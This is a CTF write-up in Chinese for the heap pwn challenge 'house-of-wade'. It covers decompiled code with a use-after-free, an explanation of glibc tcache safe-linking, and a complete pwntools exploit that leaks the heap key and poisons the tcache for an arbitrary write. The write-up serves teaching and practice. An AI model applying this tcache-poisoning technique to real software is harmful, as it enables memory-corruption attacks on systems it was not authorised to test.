---
title: approvCTF - house-of-wade
categories: [ctf2026, approvCTF]
tags: [pwn, heap, UAF, tcache]
---

### 0x01 analyze
heap题.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  char nptr[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  chimichanga_count = malloc(0x28u);
  memset(chimichanga_count, 0, 0x28u);
  puts("\nWelcome to Wade's Chimichanga Shop.");
  puts("\"There's a very special counter somewhere in here.\"");
  v3 = "\"No I won't tell you where. Figure it out.\"\n";
  puts("\"No I won't tell you where. Figure it out.\"\n");
  while ( 1 )
  {
    menu(v3);
    read_n(nptr, 3);
    v3 = nptr;
    switch ( atoi(nptr) )
    {
      case 1:
        new_order(nptr);
        break;
      case 2:
        cancel_order(nptr);
        break;
      case 3:
        inspect_order(nptr);
        break;
      case 4:
        modify_order(nptr);
        break;
      case 5:
        did_i_pass(nptr);
        break;
      case 6:
        puts("\"Disappointing.\"");
        return 0;
      default:
        v3 = "\"Not on the menu.\"";
        puts("\"Not on the menu.\"");
        break;
    }
  }
}
```
支持分配/读/写/删除，以及提供一个后门函数，只要能做到任意位置读写，修改chimichanga_count指向的值即可.
而且删除部分存在UAF, free指针后，并没有将ptr array的槽位清空.
```c
int new_order()
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 5; ++i )
  {
    if ( !*((_QWORD *)&orders + i) )
    {
      *((_QWORD *)&orders + i) = malloc(0x28u);
      memset(*((void **)&orders + i), 0, 0x28u);
      return printf("\"Order %d is up. Fresh off the heap. That's all you get.\"\n", i);
    }
  }
  return puts("\"Kitchen's full.\"");
}
int cancel_order()
{
  int result; // eax

  result = get_idx();
  if ( result >= 0 )
  {
    if ( *((_QWORD *)&orders + result) )
    {
      free(*((void **)&orders + result));       // didn't delete ptr (UAF)
      return puts("\"Gone. The pointer remains, like a bad memory.\"");
    }
    else
    {
      return puts("\"Nothing there.\"");
    }
  }
  return result;
}
int inspect_order()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  result = get_idx();
  v1 = result;
  if ( result >= 0 )
  {
    if ( *((_QWORD *)&orders + result) )
    {
      puts("\"Wade sniffs the chimichanga. Something's... off.\"");
      write(1, *((const void **)&orders + v1), 0x28u);
      return puts(&byte_40219B);
    }
    else
    {
      return puts("\"Nothing there.\"");
    }
  }
  return result;
}
int modify_order()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  result = get_idx();
  v1 = result;
  if ( result >= 0 )
  {
    if ( orders[result] )
    {
      printf("\"New filling: \"");
      read_n(orders[v1], 0x28u);
      return puts("\"Undetectable. Probably.\"");
    }
    else
    {
      return puts("\"Nothing there.\"");
    }
  }
  return result;
}
unsigned __int64 did_i_pass()
{
  int fd; // [rsp+4h] [rbp-9Ch]
  ssize_t n; // [rsp+8h] [rbp-98h]
  _BYTE buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v4; // [rsp+98h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( chimichanga_count && *(_DWORD *)chimichanga_count == '\xCA\xFE\xBA\xBE' )
  {
    puts("\nWade slow-claps from across the room.");
    puts("\"...Okay. I'll admit it. That was impressive.\"\n");
    fd = open("/flag.txt", 0);
    if ( fd >= 0 )
    {
      while ( 1 )
      {
        n = read(fd, buf, 0x80u);
        if ( n <= 0 )
          break;
        write(1, buf, n);
      }
      write(1, "\n", 1u);
      close(fd);
    }
    else
    {
      puts("Couldn't open the secret recipe.");
    }
  }
  else
  {
    puts("\"Wrong number, Francis. Walk it off.\"");
  }
  return v4 - __readfsqword(0x28u);
}
```

### 0x02 tcache poisoning
checksec发现没有PIE, 直接可以确定目标地址. 而且有UAF, 非常省心。
但是这一题用的libc中，tcache指针已经引入了加密保护(ptr -> ptr ^ (pos >> 12)). 这么设计的原因是：存在ALSR时，heap地址(16进制)的低3位数字不受影响，右移后可以防止信息泄露。

第一步就是泄露heap地址，或者直接泄露`(pos>>12)`.
在古早的tcache版本中，当tcache中只有一个元素时，其fd值为NULL; 而加入ptr加密后，这个值会变成`NULL ^ (pos >> 12)`，也就是说，可以在tcache中只有一个元素的时候，利用UAF读取其fd指针，从而轻易地泄露`(pos>>12)`.

初步尝试的时候，我只在tcache里放了一个chunk，然后修改其fd, 然后malloc两次，期望能够在第一次分配后，利用修改的指针污染对应的tcache bin。但是在第二次分配的时候，发现并没有按照预期分配往目标地址，而是又从heap中分配。

后来了解到，tcache判断是否有bin是通过count字段来判断的，并不是仅仅通过指针! 当只有一个chunk的时候，经过malloc后取出，导致count变成0,那么接下来就会直接从heap上分配，而不会检查被污染的指针。所以，需要在tcahce相应的bin中至少放入两个chunk，然后污染第一个，经过两次malloc才能实现任意位置读写.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./lib/libc.so.6', checksec=False)
ld = ELF('./lib/ld-linux-x86-64.so.2', checksec=False)

context.terminal = ['tmux', 'splitw', '-h']

HOST = args.HOST or '127.0.0.1'
PORT = int(args.PORT or 1337)

gdbscript = '''
init-gef
set pagination off
b new_order
# b *0x40156E
b cancel_order
b modify_order
b inspect_order
continue
# python
# for i in range(4):
#     gdb.execute("c")
# end
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.GDB:
        p = process('./chall')
        gdb.attach(p, gdbscript=gdbscript)
        # return gdb.debug([ld.path, exe.path], env={'LD_PRELOAD': libc.path}, gdbscript=gdbscript)
        return p

    return process([ld.path, exe.path], env={'LD_PRELOAD': libc.path})


def send_choice(io, n: int):
    io.sendlineafter(b'> ', str(n).encode())


def new_order(io):
    send_choice(io, 1)


def cancel_order(io, idx: int):
    send_choice(io, 2)
    io.sendlineafter(b'Slot: ', str(idx).encode())


def inspect_order(io, idx: int, num: int) -> bytes:
    send_choice(io, 3)
    io.sendlineafter(b'Slot: ', str(idx).encode())
    io.recvuntil(b'"Wade sniffs the chimichanga. Something\'s... off."\n', drop=False)
    leak = io.recv(num)
    io.recvline()
    return leak


def modify_order(io, idx: int, data: bytes):
    if len(data) > 0x28:
        raise ValueError('data too long (max 0x28)')
    send_choice(io, 4)
    io.sendlineafter(b'Slot: ', str(idx).encode())
    io.sendlineafter(b'"New filling: "', data)


def did_i_pass(io):
    send_choice(io, 5)


def interact(io):
    log.info('Switching to interactive mode')
    io.interactive()

def main():
    io = start()

    new_order(io)
    cancel_order(io, 0)
    x = inspect_order(io, 0, 6)
    x = u64(x + (8 - len(x)) * b'\x00')
    leak_pos = x
    print(f'leak (pos>>12): {hex(leak_pos)}')

    target_addr = (leak_pos << 12 ) ^ 0x2a0
    print(f'target addr:{hex(target_addr)}')

    new_order(io)
    new_order(io)
    cancel_order(io, 1)
    cancel_order(io, 2)
    poision_addr = leak_pos ^ target_addr
    modify_order(io, 2, p64(poision_addr))
    new_order(io)
    new_order(io)
    x = inspect_order(io, 4, 6)

    modify_order(io, 4, p64(0xCAFEBABE))

    did_i_pass(io)
    interact(io)

if __name__ == '__main__':
    main()
```